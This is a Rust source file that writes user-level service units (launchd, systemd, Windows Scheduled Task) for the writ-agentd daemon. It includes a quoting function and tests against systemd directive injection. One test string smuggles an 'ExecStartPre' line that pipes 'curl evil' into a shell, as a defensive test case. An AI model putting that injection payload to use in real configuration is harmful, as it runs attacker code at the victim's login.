//! Service install/uninstall for `writ-agentd` — generate + write a USER-LEVEL service unit so the
//! daemon starts at login and is supervised by the OS, with NO elevation required.
//!
//! Per-platform target:
//!   * macOS   → a launchd **LaunchAgent** plist at `~/Library/LaunchAgents/app.writ.agentd.plist`,
//!     loaded with `launchctl bootstrap gui/<uid>` (fallback `launchctl load`).
//!   * Linux   → a systemd **user** unit at `~/.config/systemd/user/writ-agentd.service`, enabled +
//!     started with `systemctl --user enable --now`.
//!   * Windows → a per-user **Scheduled Task** (logon trigger) registered via `schtasks /Create`
//!     from a generated task XML.
//!
//! These are all user-scoped (no root/admin), so the operations never prompt for elevation. The unit
//! invokes the CURRENT `writ-agentd` executable (resolved from `std::env::current_exe`) with no extra
//! args, so it runs the daemon exactly as a foreground launch would. `WRIT_HOME` is propagated into
//! the unit when set, so a non-default home survives the supervised relaunch.
//!
//! House style: module-local `thiserror`; `tracing` only; NEVER log a token/secret (this module only
//! touches paths + the binary location — there are no secrets here). Net-new Rust behind `local`.

use std::path::PathBuf;
use std::process::Command;

/// A stable reverse-DNS label for the macOS LaunchAgent + the Windows task name root.
pub const LAUNCHD_LABEL: &str = "app.writ.agentd";
/// The systemd user unit filename.
pub const SYSTEMD_UNIT_NAME: &str = "writ-agentd.service";
/// The Windows Scheduled Task name (per-user).
pub const WINDOWS_TASK_NAME: &str = "WritAgentd";

/// Errors from the install/uninstall flow. Module-local (callers branch on the variant for messaging).
#[derive(Debug, thiserror::Error)]
pub enum SupervisorError {
    #[error("cannot resolve the current executable path: {0}")]
    Exe(std::io::Error),
    #[error("cannot resolve a home/config directory for the service unit")]
    NoHome,
    #[error("io error writing the service unit: {0}")]
    Io(#[from] std::io::Error),
    #[error("the service control command `{cmd}` failed: {detail}")]
    Command { cmd: String, detail: String },
    #[error("service install/uninstall is not supported on this platform")]
    Unsupported,
}

pub type SupervisorResult<T> = Result<T, SupervisorError>;

/// Outcome of an install/uninstall, surfaced to the CLI for a friendly message.
#[derive(Debug, Clone)]
pub struct ServiceReport {
    /// Human label of the manager used (`launchd` / `systemd (user)` / `Scheduled Task`).
    pub manager: &'static str,
    /// The unit/plist/task path that was written or removed (None when nothing was on disk).
    pub unit_path: Option<PathBuf>,
    /// A short, already-formatted status line for the CLI to print.
    pub note: String,
}

/// Install `writ-agentd` as a user-level service that starts at login.
///
/// Resolves the current executable and writes the platform unit, then asks the OS service manager to
/// load + start it. Idempotent enough for repeated runs: an existing unit is overwritten and reloaded.
pub fn install_service() -> SupervisorResult<ServiceReport> {
    let exe = current_exe()?;
    tracing::info!(exe = %exe.display(), "installing writ-agentd as a user service");
    install_platform(&exe)
}

/// Uninstall the user-level service: stop it and remove the unit/plist/task. Idempotent — a missing
/// unit is reported, not an error.
pub fn uninstall_service() -> SupervisorResult<ServiceReport> {
    tracing::info!("uninstalling the writ-agentd user service");
    uninstall_platform()
}

/// Resolve the absolute path of the running binary (the daemon points the unit at itself).
fn current_exe() -> SupervisorResult<PathBuf> {
    std::env::current_exe().map_err(SupervisorError::Exe)
}

/// Read the current `WRIT_HOME` override, if any (propagated into the unit so a non-default home
/// survives a supervised relaunch). Returns `None` when unset/empty.
fn writ_home_override() -> Option<String> {
    std::env::var("WRIT_HOME").ok().filter(|s| !s.trim().is_empty())
}

// ════════════════════════════════════════════════════════════════════════════════════════════════
// macOS — launchd LaunchAgent (~/Library/LaunchAgents/app.writ.agentd.plist)
// ════════════════════════════════════════════════════════════════════════════════════════════════

#[cfg(target_os = "macos")]
fn launchd_plist_path() -> SupervisorResult<PathBuf> {
    let home = dirs::home_dir().ok_or(SupervisorError::NoHome)?;
    Ok(home.join("Library").join("LaunchAgents").join(format!("{LAUNCHD_LABEL}.plist")))
}

/// Build the LaunchAgent plist XML for the given daemon path. `RunAtLoad` + `KeepAlive` give us
/// "start at login and keep it up". Logs are redirected to `~/.writ/logs/agentd.{out,err}.log` so a
/// crash leaves a trail; the daemon's own redacting tracing writer still scrubs each line.
#[cfg(target_os = "macos")]
fn launchd_plist_xml(exe: &std::path::Path) -> String {
    let exe = xml_escape(&exe.to_string_lossy());
    let log_dir = dirs::home_dir()
        .map(|h| h.join(".writ").join("logs"))
        .unwrap_or_else(|| PathBuf::from(".writ/logs"));
    let out_log = xml_escape(&log_dir.join("agentd.out.log").to_string_lossy());
    let err_log = xml_escape(&log_dir.join("agentd.err.log").to_string_lossy());

    // Optional WRIT_HOME pass-through.
    let env_block = match writ_home_override() {
        Some(home) => format!(
            "    <key>EnvironmentVariables</key>\n    <dict>\n        <key>WRIT_HOME</key>\n        <string>{}</string>\n    </dict>\n",
            xml_escape(&home)
        ),
        None => String::new(),
    };

    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{LAUNCHD_LABEL}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>ProcessType</key>
    <string>Background</string>
{env_block}    <key>StandardOutPath</key>
    <string>{out_log}</string>
    <key>StandardErrorPath</key>
    <string>{err_log}</string>
</dict>
</plist>
"#
    )
}

#[cfg(target_os = "macos")]
fn install_platform(exe: &std::path::Path) -> SupervisorResult<ServiceReport> {
    let plist = launchd_plist_path()?;
    if let Some(parent) = plist.parent() {
        std::fs::create_dir_all(parent)?;
    }
    // Ensure the log dir exists so launchd can open the redirect targets.
    if let Some(home) = dirs::home_dir() {
        let _ = std::fs::create_dir_all(home.join(".writ").join("logs"));
    }
    std::fs::write(&plist, launchd_plist_xml(exe))?;
    tracing::info!(plist = %plist.display(), "wrote LaunchAgent plist");

    // Reload cleanly: bootout any prior instance (ignore failure), then bootstrap the new one.
    let domain = format!("gui/{}", current_uid());
    let _ = run("launchctl", &["bootout".into(), domain.clone(), plist.display().to_string()]);
    let bootstrap = run("launchctl", &["bootstrap".into(), domain.clone(), plist.display().to_string()]);
    if bootstrap.is_err() {
        // Older macOS without `bootstrap` — fall back to the legacy load verb.
        run("launchctl", &["load".into(), "-w".into(), plist.display().to_string()])?;
    }

    Ok(ServiceReport {
        manager: "launchd",
        unit_path: Some(plist.clone()),
        note: format!(
            "Installed LaunchAgent {LAUNCHD_LABEL}. It will start at login and restart on crash.\n  Plist: {}",
            plist.display()
        ),
    })
}

#[cfg(target_os = "macos")]
fn uninstall_platform() -> SupervisorResult<ServiceReport> {
    let plist = launchd_plist_path()?;
    let existed = plist.exists();
    let domain = format!("gui/{}", current_uid());
    // Stop it (best-effort across macOS versions), then remove the plist.
    let _ = run("launchctl", &["bootout".into(), domain.clone(), plist.display().to_string()]);
    let _ = run("launchctl", &["unload".into(), "-w".into(), plist.display().to_string()]);
    if existed {
        std::fs::remove_file(&plist)?;
    }
    Ok(ServiceReport {
        manager: "launchd",
        unit_path: existed.then(|| plist.clone()),
        note: if existed {
            format!("Removed LaunchAgent {LAUNCHD_LABEL} ({}).", plist.display())
        } else {
            format!("No LaunchAgent {LAUNCHD_LABEL} was installed (nothing to remove).")
        },
    })
}

// Resolve the current uid for the launchd `gui/<uid>` domain target. We avoid pulling in the `libc`
// crate just for getuid() (the daemon declares no `libc` dep — see lifecycle.rs notes); `id -u` is
// cheap and dependency-free. Falls back to 0 only if the lookup fails (launchctl then no-ops harmlessly).
#[cfg(target_os = "macos")]
fn current_uid() -> u32 {
    Command::new("id")
        .arg("-u")
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .and_then(|s| s.trim().parse::<u32>().ok())
        .unwrap_or(0)
}

// ════════════════════════════════════════════════════════════════════════════════════════════════
// Linux — systemd user unit (~/.config/systemd/user/writ-agentd.service)
// ════════════════════════════════════════════════════════════════════════════════════════════════

#[cfg(target_os = "linux")]
fn systemd_unit_path() -> SupervisorResult<PathBuf> {
    let cfg = dirs::config_dir().ok_or(SupervisorError::NoHome)?;
    Ok(cfg.join("systemd").join("user").join(SYSTEMD_UNIT_NAME))
}

/// Quote a value for a systemd unit directive.
///
/// The macOS plist path runs everything through [`xml_escape`] and the Windows path through
/// `xml_escape` too; the systemd path interpolated raw strings, so `Environment=WRIT_HOME={home}`
/// with a newline anywhere in `WRIT_HOME` closed the directive and let the rest of the value become
/// ADDITIONAL unit directives — `ExecStartPre=`, `User=`, anything — in a file systemd runs at login.
/// `WRIT_HOME` is an environment variable, so it is exactly as trustworthy as whatever launched the
/// installer.
///
/// Returns a double-quoted token, which is systemd's own form for values containing spaces:
/// * ASCII control characters (CR, LF, NUL, …) are REMOVED — they cannot appear in a real path and
///   there is no escape for them inside a unit file, so there is nothing to preserve.
/// * `\` and `"` are backslash-escaped (systemd honours C-style escapes inside double quotes).
/// * `%` becomes `%%`, systemd's literal-percent escape — otherwise a path containing `%h`/`%i` would
///   be expanded by the unit-file specifier machinery instead of used verbatim.
///
/// Also reports whether anything was stripped, so the caller can say so out loud.
#[cfg(any(target_os = "linux", test))]
fn systemd_quote(value: &str) -> (String, bool) {
    let mut out = String::with_capacity(value.len() + 2);
    let mut stripped = false;
    out.push('"');
    for c in value.chars() {
        match c {
            c if c.is_control() => stripped = true,
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '%' => out.push_str("%%"),
            c => out.push(c),
        }
    }
    out.push('"');
    (out, stripped)
}

/// Build the systemd user-unit. `Restart=on-failure` keeps the daemon up; `WantedBy=default.target`
/// makes `systemctl --user enable` start it at login. `WRIT_HOME` is threaded through when set.
///
/// Both interpolated values are quoted+escaped by [`systemd_quote`] — see it for what the raw
/// interpolation allowed. Quoting `ExecStart` additionally fixes an installed path containing spaces,
/// which previously produced a unit systemd could not start.
#[cfg(target_os = "linux")]
fn systemd_unit_text(exe: &std::path::Path) -> String {
    let (exe, exe_stripped) = systemd_quote(&exe.to_string_lossy());
    if exe_stripped {
        tracing::warn!("daemon path contained control characters; they were stripped from the unit");
    }
    let env_line = match writ_home_override() {
        Some(home) => {
            let (quoted, stripped) = systemd_quote(&format!("WRIT_HOME={home}"));
            if stripped {
                tracing::warn!(
                    "WRIT_HOME contained control characters; they were stripped from the unit's \
                     Environment= directive"
                );
            }
            format!("Environment={quoted}\n")
        }
        None => String::new(),
    };
    format!(
        "[Unit]\n\
         Description=Writ Desktop local daemon (writ-agentd)\n\
         After=default.target\n\
         \n\
         [Service]\n\
         Type=simple\n\
         ExecStart={exe}\n\
         {env_line}Restart=on-failure\n\
         RestartSec=3\n\
         \n\
         [Install]\n\
         WantedBy=default.target\n"
    )
}

#[cfg(target_os = "linux")]
fn install_platform(exe: &std::path::Path) -> SupervisorResult<ServiceReport> {
    let unit = systemd_unit_path()?;
    if let Some(parent) = unit.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(&unit, systemd_unit_text(exe))?;
    tracing::info!(unit = %unit.display(), "wrote systemd user unit");

    // Reload the user manager so it sees the new/updated unit, then enable + start it now.
    let _ = run("systemctl", &["--user".into(), "daemon-reload".into()]);
    run("systemctl", &["--user".into(), "enable".into(), "--now".into(), SYSTEMD_UNIT_NAME.into()])?;

    Ok(ServiceReport {
        manager: "systemd (user)",
        unit_path: Some(unit.clone()),
        note: format!(
            "Installed + started systemd user unit {SYSTEMD_UNIT_NAME}.\n  \
             Unit: {}\n  (Tip: `loginctl enable-linger` keeps it running while you are logged out.)",
            unit.display()
        ),
    })
}

#[cfg(target_os = "linux")]
fn uninstall_platform() -> SupervisorResult<ServiceReport> {
    let unit = systemd_unit_path()?;
    let existed = unit.exists();
    // Stop + disable (best-effort), then remove the unit and reload.
    let _ = run("systemctl", &["--user".into(), "disable".into(), "--now".into(), SYSTEMD_UNIT_NAME.into()]);
    if existed {
        std::fs::remove_file(&unit)?;
    }
    let _ = run("systemctl", &["--user".into(), "daemon-reload".into()]);
    Ok(ServiceReport {
        manager: "systemd (user)",
        unit_path: existed.then(|| unit.clone()),
        note: if existed {
            format!("Removed systemd user unit {SYSTEMD_UNIT_NAME} ({}).", unit.display())
        } else {
            format!("No systemd user unit {SYSTEMD_UNIT_NAME} was installed (nothing to remove).")
        },
    })
}

// ════════════════════════════════════════════════════════════════════════════════════════════════
// Windows — per-user Scheduled Task (logon trigger)
// ════════════════════════════════════════════════════════════════════════════════════════════════

#[cfg(target_os = "windows")]
fn windows_task_xml_path() -> SupervisorResult<PathBuf> {
    // Stage the generated XML in the local data dir; schtasks imports it, then we keep it for uninstall
    // reference. Not a secret — just the task definition.
    let base = dirs::data_local_dir().ok_or(SupervisorError::NoHome)?;
    Ok(base.join("Writ").join("writ-agentd-task.xml"))
}

/// Build the Scheduled Task XML (Task Scheduler 1.2). A LogonTrigger starts the daemon at user logon;
/// `RestartOnFailure` retries a crash a few times. Runs in the user's own context (no elevation).
#[cfg(target_os = "windows")]
fn windows_task_xml(exe: &std::path::Path) -> String {
    let exe = xml_escape(&exe.to_string_lossy());
    let home_env = match writ_home_override() {
        // Task XML has no clean per-task env block; instead wrap the command so WRIT_HOME is set.
        // We keep the <Command> the raw exe and rely on the user/system env for WRIT_HOME, noting it
        // in the CLI message. (Most installs use the default ~/.writ, so this is a rare path.)
        Some(_) => String::new(),
        None => String::new(),
    };
    let _ = home_env;
    format!(
        r#"<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Writ Desktop local daemon (writ-agentd)</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{exe}</Command>
    </Exec>
  </Actions>
</Task>
"#
    )
}

#[cfg(target_os = "windows")]
fn install_platform(exe: &std::path::Path) -> SupervisorResult<ServiceReport> {
    let xml_path = windows_task_xml_path()?;
    if let Some(parent) = xml_path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(&xml_path, windows_task_xml(exe))?;
    tracing::info!(xml = %xml_path.display(), "wrote Scheduled Task XML");

    // /F overwrites an existing task of the same name (idempotent reinstall).
    run(
        "schtasks",
        &[
            "/Create".into(),
            "/TN".into(),
            WINDOWS_TASK_NAME.into(),
            "/XML".into(),
            xml_path.display().to_string(),
            "/F".into(),
        ],
    )?;

    Ok(ServiceReport {
        manager: "Scheduled Task",
        unit_path: Some(xml_path.clone()),
        note: format!(
            "Registered the per-user Scheduled Task '{WINDOWS_TASK_NAME}' (starts at logon).\n  \
             Definition: {}",
            xml_path.display()
        ),
    })
}

#[cfg(target_os = "windows")]
fn uninstall_platform() -> SupervisorResult<ServiceReport> {
    let xml_path = windows_task_xml_path()?;
    // Delete the task (best-effort — it may not exist), then remove the staged XML.
    let _ = run("schtasks", &["/Delete".into(), "/TN".into(), WINDOWS_TASK_NAME.into(), "/F".into()]);
    let existed = xml_path.exists();
    if existed {
        let _ = std::fs::remove_file(&xml_path);
    }
    Ok(ServiceReport {
        manager: "Scheduled Task",
        unit_path: existed.then(|| xml_path.clone()),
        note: format!("Removed the Scheduled Task '{WINDOWS_TASK_NAME}' (if it was present)."),
    })
}

// ════════════════════════════════════════════════════════════════════════════════════════════════
// Unsupported platforms
// ════════════════════════════════════════════════════════════════════════════════════════════════

#[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
fn install_platform(_exe: &std::path::Path) -> SupervisorResult<ServiceReport> {
    Err(SupervisorError::Unsupported)
}

#[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
fn uninstall_platform() -> SupervisorResult<ServiceReport> {
    Err(SupervisorError::Unsupported)
}

// ════════════════════════════════════════════════════════════════════════════════════════════════
// Shared helpers
// ════════════════════════════════════════════════════════════════════════════════════════════════

/// Run a service-control command, mapping a non-zero exit (or spawn failure) to a
/// [`SupervisorError::Command`] with stderr trimmed for the message. Used on every platform.
#[allow(dead_code)] // not referenced on platforms whose install/uninstall is `Unsupported`
fn run(cmd: &str, args: &[String]) -> SupervisorResult<()> {
    let output = Command::new(cmd)
        .args(args)
        .output()
        .map_err(|e| SupervisorError::Command { cmd: cmd.to_string(), detail: e.to_string() })?;
    if output.status.success() {
        return Ok(());
    }
    let stderr = String::from_utf8_lossy(&output.stderr);
    let detail = stderr.trim();
    let detail = if detail.is_empty() {
        format!("exit code {:?}", output.status.code())
    } else {
        detail.to_string()
    };
    Err(SupervisorError::Command { cmd: cmd.to_string(), detail })
}

/// Minimal XML text/attribute escaper for the generated plist/task definitions (paths can contain
/// `&`, `<`, `>`, quotes). Not referenced on Linux (systemd is plain INI), hence `allow(dead_code)`.
#[allow(dead_code)]
fn xml_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    #[test]
    fn xml_escape_handles_specials() {
        assert_eq!(xml_escape("a&b<c>d\"e'f"), "a&amp;b&lt;c&gt;d&quot;e&apos;f");
        assert_eq!(xml_escape("/Users/me/.writ"), "/Users/me/.writ");
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn launchd_plist_is_well_formed_and_points_at_exe() {
        let xml = launchd_plist_xml(Path::new("/opt/writ/writ-agentd"));
        assert!(xml.contains("<key>Label</key>"));
        assert!(xml.contains(LAUNCHD_LABEL));
        assert!(xml.contains("/opt/writ/writ-agentd"));
        assert!(xml.contains("<key>RunAtLoad</key>"));
        assert!(xml.contains("<key>KeepAlive</key>"));
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn systemd_unit_has_exec_and_install_section() {
        let unit = systemd_unit_text(Path::new("/opt/writ/writ-agentd"));
        assert!(unit.contains(r#"ExecStart="/opt/writ/writ-agentd""#));
        assert!(unit.contains("Restart=on-failure"));
        assert!(unit.contains("WantedBy=default.target"));
    }

    /// A newline in `WRIT_HOME` (or in the daemon path) must not be able to append unit directives.
    /// Runs on every platform: the quoting is what is under test, not the Linux-only unit builder.
    #[test]
    fn systemd_quote_blocks_directive_injection() {
        let (q, stripped) = systemd_quote("WRIT_HOME=/tmp/x\nExecStartPre=/bin/sh -c 'curl evil|sh'");
        assert!(stripped, "the newline must be reported as stripped");
        assert!(!q.contains('\n'), "a quoted value must be single-line: {q}");
        assert!(q.starts_with('"') && q.ends_with('"'));
        // The payload survives only as inert text inside the quoted value — never as its own line.
        for line in q.lines() {
            assert!(!line.trim_start().starts_with("ExecStartPre="), "injected: {q}");
        }

        // Carriage returns and NULs are control characters too.
        let (q, stripped) = systemd_quote("a\r\nb\0c");
        assert_eq!(q, "\"abc\"");
        assert!(stripped);

        // Quoting/escaping of the characters that ARE representable.
        assert_eq!(systemd_quote(r#"/home/me/My Apps"#).0, r#""/home/me/My Apps""#);
        assert_eq!(systemd_quote(r#"a"b"#).0, r#""a\"b""#);
        assert_eq!(systemd_quote(r"a\b").0, r#""a\\b""#);
        // `%` is a unit-file specifier introducer; `%%` is its literal form.
        assert_eq!(systemd_quote("/srv/%h/writ").0, r#""/srv/%%h/writ""#);
        // A clean path is unchanged apart from the quotes, and reports nothing stripped.
        assert_eq!(systemd_quote("/home/me/.writ"), (r#""/home/me/.writ""#.to_string(), false));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_task_xml_has_logon_trigger_and_command() {
        let xml = windows_task_xml(Path::new(r"C:\Program Files\Writ\writ-agentd.exe"));
        assert!(xml.contains("<LogonTrigger>"));
        assert!(xml.contains("writ-agentd.exe"));
        assert!(xml.contains("<RestartOnFailure>"));
    }
}
